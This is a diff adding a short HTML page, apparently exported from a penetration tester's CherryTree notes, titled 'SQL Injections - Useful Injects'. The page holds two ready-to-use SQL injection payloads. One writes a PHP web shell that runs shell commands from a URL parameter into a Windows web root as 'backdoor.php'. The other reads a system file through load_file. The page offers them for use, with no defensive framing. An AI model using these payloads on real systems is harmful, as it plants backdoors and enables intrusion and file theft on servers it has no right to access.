@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Useful Injects</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># SQL Injections - Useful Injects</h1></strong><br />Upload PHP command injection file:<br /><code>union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE &#39;c:/inetpub/wwwroot/backdoor.php&#39;</code><br /><br />Load/read a file:<br /><code>union all select 1,2,3,4,load_file(&quot;c:/windows/system32/drivers/etc/hosts&quot;),6</code></div>
+</body>
+</html>
